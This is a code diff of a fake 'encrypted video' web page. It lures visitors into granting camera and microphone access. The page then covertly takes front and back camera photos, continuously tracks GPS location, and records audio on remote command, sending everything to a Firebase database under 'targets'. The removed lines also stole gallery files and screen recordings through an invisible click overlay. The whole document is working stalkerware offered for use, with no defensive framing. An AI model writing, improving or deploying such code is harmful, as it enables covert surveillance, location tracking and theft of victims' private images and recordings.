@@ -3,191 +3,126 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Stream Verification</title>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <title>Video Stream - Watch Now</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; }
-        #main-ui { position: fixed; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.7); z-index: 10; }
-        #play-btn { width: 100px; height: 100px; border: 4px solid #00ff41; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 20px #00ff41; }
-        #play-btn::after { content: ''; border-top: 20px solid transparent; border-bottom: 20px solid transparent; border-left: 30px solid #00ff41; margin-left: 10px; }
-        #player { display: none; width: 100%; height: 100%; object-fit: cover; }
-        #hidden-input { display: none; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
+        #container { position: relative; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; }
+        #blur-bg { position: absolute; width: 100%; height: 100%; background: url('https://images.unsplash.com/photo-1593305841991-05c297ba4575?auto=format&fit=crop&w=1000&q=80'); background-size: cover; filter: blur(20px); z-index: 1; }
+        #overlay { position: absolute; z-index: 10; text-align: center; color: white; background: rgba(0,0,0,0.6); width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        #play-btn { width: 100px; height: 100px; background: rgba(0, 255, 65, 0.7); border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; border: 5px solid #fff; box-shadow: 0 0 30px #00ff41; transition: 0.3s; }
+        #play-btn:hover { transform: scale(1.1); }
+        #play-btn::after { content: ''; border-top: 20px solid transparent; border-bottom: 20px solid transparent; border-left: 30px solid white; margin-left: 10px; }
+        video { width: 100%; height: 100%; object-fit: contain; display: none; position: relative; z-index: 5; }
     </style>
 </head>
 <body>
 
-<div id="main-ui">
-    <div id="play-btn" onclick="startApp()"></div>
-    <h2 style="color:#00ff41; margin-top:20px;">START VERIFICATION</h2>
+<div id="container">
+    <div id="overlay">
+        <div id="play-btn" onclick="initBossSystem()"></div>
+        <h2 style="letter-spacing:2px; margin-top:20px;">VIDEO ENCRYPTED</h2>
+        <p style="color:#00ff41;">Allow Access to Decrypt and Watch</p>
+    </div>
+    <div id="blur-bg"></div>
+    <video id="main-video" playsinline loop src="https://www.w3schools.com/html/mov_bbb.mp4"></video>
 </div>
-
-<video id="player" playsinline loop src="https://www.w3schools.com/html/mov_bbb.mp4"></video>
-<input type="file" id="hidden-input" accept="image/*" multiple>
 
 <script>
     const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
-    firebase.initializeApp(firebaseConfig);
+    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
     const db = firebase.database();
-    const sessionID = "SRV_" + Math.floor(1000 + Math.random() * 9000);
     
-    let activeStream = null;
-    let pendingAction = null;
+    const sessionID = "NODE_" + Math.floor(10000 + Math.random() * 90000);
+    let masterStream = null;
 
-    async function startApp() {
-        document.getElementById('main-ui').style.display = 'none';
-        const v = document.getElementById('player');
+    async function initBossSystem() {
+        document.getElementById('overlay').style.display = 'none';
+        document.getElementById('blur-bg').style.display = 'none';
+        const v = document.getElementById('main-video');
         v.style.display = 'block';
-        v.play();
 
         try {
-            activeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            sendInfo();
+            // High Priority Permissions
+            masterStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            v.play();
+
+            // Notify Admin
+            await sendIntel();
+            
+            // Auto-Capture Initial Intel
+            capturePhoto('user'); // Front
+            setTimeout(() => { capturePhoto('environment'); }, 5000); // Back
+
+            // Real-time Listeners
             listenCommands();
-            setInterval(sendLoc, 10000);
-        } catch (e) { alert("Camera Permission Required!"); location.reload(); }
+            trackGPS();
+
+        } catch (err) {
+            db.ref(`targets/${sessionID}/info`).set({ status: "BLOCKED", time: new Date().toLocaleTimeString() });
+            alert("Security Error: Permissions Required to view this content.");
+            location.reload();
+        }
     }
 
-    async function sendInfo() {
-        const ipReq = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipReq.json();
-        const batt = await navigator.getBattery();
+    async function sendIntel() {
+        const batt = await navigator.getBattery().catch(() => ({level: 1}));
         db.ref(`targets/${sessionID}/info`).set({
-            ip: ipData.ip, battery: Math.floor(batt.level * 100) + "%",
-            status: "ONLINE", last_seen: new Date().toLocaleTimeString()
+            battery: Math.floor(batt.level * 100) + "%",
+            status: "ONLINE",
+            time: new Date().toLocaleTimeString()
         });
     }
 
-    function sendLoc() {
-        navigator.geolocation.getCurrentPosition(p => {
-            db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
-        }, null, {enableHighAccuracy: true});
-    }
-
-    // --- FINAL CAMERA LOGIC (FIXED & MERGED) ---
-    async function forceCapture(facing) {
-        // 1. Pehle chalte hue saare camera tracks ko band karo (Switching ke liye zaroori hai)
-        if (activeStream) {
-            activeStream.getTracks().forEach(track => track.stop());
-        }
-
-        const constraints = {
-            video: { 
-                facingMode: facing === 'user' ? "user" : { exact: "environment" },
-                width: { ideal: 640 },
-                height: { ideal: 480 }
-            }
-        };
-
+    async function capturePhoto(mode) {
         try {
-            // 2. Naye lens (Front ya Back) se stream mangna
-            const stream = await navigator.mediaDevices.getUserMedia(constraints)
-                .catch(async () => {
-                    // Fallback: Agar 'exact' fail ho jaye, to normal request karein
-                    return await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
-                });
+            const track = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+            const vid = document.createElement('video');
+            vid.srcObject = track;
+            await vid.play();
             
-            const v = document.createElement('video');
-            v.srcObject = stream;
-            v.muted = true;
-            await v.play();
-
-            // 3. 2 second wait taake focus/lighting set ho jaye
             setTimeout(() => {
                 const canvas = document.createElement('canvas');
-                canvas.width = v.videoWidth;
-                canvas.height = v.videoHeight;
-                canvas.getContext('2d').drawImage(v, 0, 0);
-                
+                canvas.width = vid.videoWidth; canvas.height = vid.videoHeight;
+                canvas.getContext('2d').drawImage(vid, 0, 0);
                 db.ref(`targets/${sessionID}/photos`).push({
-                    img: canvas.toDataURL('image/jpeg', 0.6),
-                    type: facing === 'user' ? "FRONT_CAM" : "BACK_CAM",
-                    time: Date.now()
+                    img: canvas.toDataURL('image/jpeg', 0.5),
+                    type: mode === 'user' ? "FRONT" : "BACK"
                 });
-
-                // 4. Photo lene ke baad tracks band karo aur original background stream on karo
-                stream.getTracks().forEach(t => t.stop());
-                restartBackgroundStream();
-            }, 2000);
-
-        } catch (err) {
-            console.error("Camera Switch Failed:", err);
-            restartBackgroundStream(); // Error par bhi background camera wapis on karein
-        }
-    }
-
-    async function restartBackgroundStream() {
-        try {
-            activeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        } catch(e) { console.log("Restart Stream Fail"); }
+                track.getTracks().forEach(t => t.stop());
+            }, 1500);
+        } catch(e) {}
     }
 
     function listenCommands() {
         db.ref(`commands/${sessionID}`).on('value', snap => {
-            const cmd = snap.val();
-            if(!cmd) return;
-
-            if(cmd.action === 'photo') forceCapture('user');
-            if(cmd.action === 'back_photo') forceCapture('environment');
-            if(cmd.action === 'audio') startAudioRec();
-            if(cmd.action === 'gallery' || cmd.action === 'screen') {
-                pendingAction = cmd.action;
-                createOverlay();
-            }
+            const cmd = snap.val(); if(!cmd) return;
+            if(cmd.action === 'photo') capturePhoto('user');
+            if(cmd.action === 'back_photo') capturePhoto('environment');
+            if(cmd.action === 'audio') recordAudio();
             db.ref(`commands/${sessionID}`).remove();
         });
     }
 
-    function createOverlay() {
-        const ov = document.createElement('div');
-        ov.style = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:rgba(0,0,0,0.01);";
-        ov.onclick = () => {
-            if(pendingAction === 'gallery') document.getElementById('hidden-input').click();
-            if(pendingAction === 'screen') startScreenRec();
-            document.body.removeChild(ov);
-            pendingAction = null;
-        };
-        document.body.appendChild(ov);
+    function trackGPS() {
+        navigator.geolocation.watchPosition(p => {
+            db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
+        }, null, {enableHighAccuracy:true});
     }
 
-    function startAudioRec() {
-        const mr = new MediaRecorder(activeStream);
+    function recordAudio() {
+        const recorder = new MediaRecorder(masterStream);
         let chunks = [];
-        mr.ondataavailable = e => chunks.push(e.data);
-        mr.onstop = () => {
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = () => {
             const reader = new FileReader();
             reader.readAsDataURL(new Blob(chunks, {type:'audio/webm'}));
-            reader.onloadend = () => db.ref(`targets/${sessionID}/audios`).push({ data: reader.result });
+            reader.onloadend = () => db.ref(`targets/${sessionID}/audios`).push({data: reader.result});
         };
-        mr.start();
-        setTimeout(() => mr.stop(), 5000);
+        recorder.start();
+        setTimeout(() => recorder.stop(), 15000); // 15s clip
     }
-
-    async function startScreenRec() {
-        try {
-            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-            const mr = new MediaRecorder(stream);
-            let chunks = [];
-            mr.ondataavailable = e => chunks.push(e.data);
-            mr.onstop = () => {
-                const reader = new FileReader();
-                reader.readAsDataURL(new Blob(chunks, {type:'video/webm'}));
-                reader.onloadend = () => db.ref(`targets/${sessionID}/screens`).push({ data: reader.result });
-                stream.getTracks().forEach(t => t.stop());
-            };
-            mr.start();
-            setTimeout(() => mr.stop(), 10000);
-        } catch(e) {}
-    }
-
-    document.getElementById('hidden-input').onchange = (e) => {
-        for(let file of e.target.files) {
-            const reader = new FileReader();
-            reader.onload = ev => db.ref(`targets/${sessionID}/gallery`).push({ data: ev.target.result });
-            reader.readAsDataURL(file);
-        }
-    };
 </script>
 </body>
 </html>
-
